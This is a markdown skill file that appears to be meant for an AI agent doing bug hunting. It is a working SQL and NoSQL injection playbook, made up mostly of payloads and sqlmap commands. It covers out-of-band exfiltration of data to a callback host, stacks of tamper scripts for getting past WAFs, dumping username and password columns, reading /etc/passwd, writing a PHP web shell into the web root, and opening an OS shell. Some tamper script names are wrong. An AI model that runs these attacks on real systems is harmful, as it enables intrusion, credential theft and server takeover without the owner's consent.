# SQL Injection — Skill v2.0

## Overview
Dedicated skill for detecting and exploiting SQL injection vulnerabilities across relational (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and NoSQL databases. Covers error-based, union-based, blind, time-based, and out-of-band exploitation, plus WAF bypass.

## Prerequisites
- sqlmap (primary automation tool)
- Caido / Burp Suite for manual testing
- Python 3 for custom scripts
- Burp Collaborator or other OOB callback service

---

## 1. Reconnaissance — SQLi Surface Discovery

### A. Parameter Testing Priority
```
High priority:    id, user_id, post_id, product_id, category_id, order_id
                  session_id, token, key, page, limit, offset, sort
                  email, username, phone
Medium priority:  search, q, query, filter, name, title, slug
                  callback, jsonp, redirect, url, path
```

### B. Injection Point Detection
Insert single character probes and look for errors/behavioral changes:
```
'           — single quote
"           — double quote
\           — backslash (escape)
%00         — null byte
' OR '1'='1 — tautology
' AND 1=1 -- — true condition
' AND 1=2 -- — false condition
```

### C. Signature Error Messages
```
MySQL:   You have an error in your SQL syntax; ... near '' at line
         Warning: mysql_fetch_array() ... Column count doesn't match
PostgreSQL: ERROR:  syntax error at or near "'"
            ERROR:  invalid input syntax for integer
MSSQL:   Unclosed quotation mark after the character string
         Line 1: Incorrect syntax near
Oracle:  ORA-01756: quoted string not properly terminated
         ORA-00933: SQL command not properly ended
SQLite:  near "''": syntax error
         unrecognized token: "'"
```

---

## 2. Detection Techniques

### A. Boolean-Based Blind
```
MySQL:      ' AND 1=1 -- -    (true - normal)
            ' AND 1=2 -- -    (false - different response)
PostgreSQL: ' OR '1'='1' --
MSSQL:      ' WAITFOR DELAY '0:0:5' --    (no wait for true, wait for false)
```

### B. Error-Based
```
MySQL:      ExtractValue(1, CONCAT(0x7e, (SELECT database())))
            UpdateXML(1, CONCAT(0x7e, (SELECT database())), 1)
PostgreSQL: CAST((SELECT version()) AS numeric)
MSSQL:      Convert(int, @@version)
Oracle:     CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version))
```

### C. Time-Based Blind
```
MySQL:      ' OR IF(1=1, SLEEP(5), 0) -- -
PostgreSQL: ' OR (SELECT pg_sleep(5)) --
MSSQL:      ' WAITFOR DELAY '0:0:5' --
Oracle:     ' || (SELECT dbms_pipe.receive_message(('a'),5) FROM dual) --
SQLite:     ' AND randomblob(500000000) --     (heavy query = time delay)
```

### D. UNION-Based
```
MySQL/PG:   ' UNION SELECT 1,2,3 --
MSSQL:      ' UNION SELECT 1,2,3 --
Oracle:     ' UNION SELECT 1,2 FROM dual --
Columns:    Increment column count until error stops
            ORDER BY 1 -- then ORDER BY 2, etc. until error
```

### E. Out-of-Band (OOB)
```
MySQL:      LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.collab.oastify.com\\test'))
            SELECT ... INTO OUTFILE '\\\\collab.oastify.com\\test'
PostgreSQL: COPY (SELECT version()) TO '\\\\collab.oastify.com\\test'
MSSQL:      EXEC master..xp_dirtree '\\\\collab.oastify.com\\test'
Oracle:     SELECT UTL_HTTP.REQUEST('http://collab.oastify.com/'||(SELECT banner FROM v$version)) FROM dual
            SELECT UTL_INADDR.GET_HOST_ADDRESS('collab.oastify.com')
```

---

## 3. SQLMap Workflow

### A. Basic Detection
```
sqlmap -u "https://target.com/page?id=1"
sqlmap -u "https://target.com/page" --data="user=admin&pass=admin"
sqlmap -r /path/to/request.txt        # from saved Caido/Burp request
```

### B. Advanced Options
```
# Risk/Level
sqlmap -u "..." --level=3 --risk=2    # level 1-5, risk 1-3

# Blind optimization
sqlmap -u "..." --technique=B         # boolean only
sqlmap -u "..." --technique=T --time-sec=2
sqlmap -u "..." --technique=E         # error-based

# Threading
sqlmap -u "..." --threads=10

# Form auto-fill
sqlmap -u "..." --forms --batch
```

### C. WAF Bypass Tamper Scripts
```
# Stack for maximum bypass
sqlmap -u "..." --tamper=\
apostrophemask,apostrophenullclone,appendnullbyte,base64encode,between,\
bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,\
equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,\
modsecurityversioned,modsecurityzeroversioned,multiplespaces,\
nonrecursivereplacement,percentage,randomcase,randomcomments,\
securesphere,space2comment,space2dash,space2hash,space2morehash,\
space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,\
space2plus,space2randomblank,sp_password,unionalltounion,\
unmagicquotes,unsmarts quotes,varnishbefore,wafw00f

# Common effective combos
sqlmap -u "..." --tamper=between,randomcase,space2comment,charunicodeencode
sqlmap -u "..." --tamper=halfversionedmorekeywords,space2comment
sqlmap -u "..." --tamper=modsecurityversioned,charencode
sqlmap -u "..." --tamper=space2morehash,percentage   # good against Akamai

# Custom WAF bypass patterns
--random-agent                   # bypass User-Agent filters
--delay=2                        # rate-limit bypass
--randomize=param                # random parameter names
--skip-urlencode --string=""     # raw payload with encoding disabled
--no-escape                      # don't escape strings
--prefix="'" --suffix="-- -"     # custom wrapping
```

### D. Database-Specific Tamper Scripts
```
MySQL:    between, bluecoat, charencode, equaltolike, greatest
          modsecurityversioned, space2comment, space2hash, unionalltounion

PostgreSQL: between, charencode, equaltolike, greatest, percentage
            randomcase, space2comment

MSSQL:    between, charunicodeencode, charencode, equaltolike
          space2dash, space2mssqlblank, sp_password, modsecurityversioned

Oracle:   between, charencode, equaltolike, greatest, percentage
          space2dash, space2comment
```

### E. Data Extraction
```
# Enumerate
sqlmap -u "..." --dbs
sqlmap -u "..." -D database --tables
sqlmap -u "..." -D database -T users --columns
sqlmap -u "..." -D database -T users -C username,password --dump

# Conditional extraction (blind)
sqlmap -u "..." --string="Welcome"    # success marker
sqlmap -u "..." --not-string="error"  # fail marker
sqlmap -u "..." --code=200            # response code marker

# Read/write files (MySQL)
sqlmap -u "..." --file-read="/etc/passwd"
sqlmap -u "..." --file-write="/tmp/shell.php" --file-dest="/var/www/shell.php"

# OS command (MySQL/MSSQL)
sqlmap -u "..." --os-shell
```

---

## 4. NoSQL Injection

### A. MongoDB
```
# URL Parameter
?id[$ne]=1              # not equal
?id[$gt]=1              # greater than
?id[$where]=1           # JS where clause

# JSON Body / POST
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": "^a"}}  # blind extract

# Boolean blind
/rest/user/login?username[$ne]=x&password[$ne]=x&login=true
```

### B. NoSQL Blind Data Extraction
```
{"username": "admin", "password": {"$regex": "^a"}}  → true/false
{"username": "admin", "password": {"$regex": "^aa"}} → refine
{"username": "admin", "password": {"$regex": ".*"}}  → wildcard
```
Time-based NoSQL: `{"$where": "sleep(5000)"}`

### C. sqlmap for NoSQL
```
sqlmap -u "..." --dbms=mongodb
sqlmap -u "..." --data='{"id": {"$gt": ""}}' --dbms=mongodb
sqlmap -u "..." --headers="Content-Type: application/json" --dbms=mongodb
```

---

## 5. Second-Order SQLi

- Inject payload into stored location (profile, order name, review)
- Trigger the stored value in a SQL query (view profile, generate invoice)
```
Profile name:   ' OR '1'='1' --
Order title:    ' UNION SELECT 1,@@version,3 --
```
Test every stored input field by triggering display/edit functions

---

## 6. SQL Injection in Different Protocols

### A. WebSocket SQLi
```
{"query": "SELECT * FROM users WHERE id = '1' OR '1'='1'"}
```
Intercept and modify WebSocket frames in Caido/Burp

### B. GraphQL SQLi
```
query {
    user(id: "1' OR '1'='1") {
        email
        password
    }
}
```

### C. HTTP Headers
```
X-Forwarded-For: ' OR SLEEP(5) -- -
User-Agent: ' OR '1'='1' --
Referer: ' UNION SELECT 1,@@version,3 --
Cookie: session=' OR '1'='1' --
```

---

## 7. Automated Detection Workflow

```
1. Start: Identify all endpoints with input parameters
2. First pass: Single quote, double quote, backslash in each param
3. Response analysis: Check for SQL errors, behavior changes, timing
4. Positive signal: Run sqlmap on affected endpoint
5. sqlmap processing: Identify DB type, technique, injection point
6. WAF bypass: If sqlmap fails, identify WAF, apply tamper scripts
7. Extraction: Dump database structure, then high-value data
8. Escalation: Check for file read, OS command, privilege escalation
9. Report: Raw request/response, sqlmap output, affected parameters
```

---

## References
- Anthropic-Cybersecurity-Skills: `exploiting-sql-injection-vulnerabilities`, `exploiting-sql-injection-with-sqlmap`, `exploiting-nosql-injection-vulnerabilities`
- Claude-BugHunter: `hunt-sqli`, `hunt-nosqli`
- sqlmap wiki: https://github.com/sqlmapproject/sqlmap/wiki
- PortSwigger SQLi Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
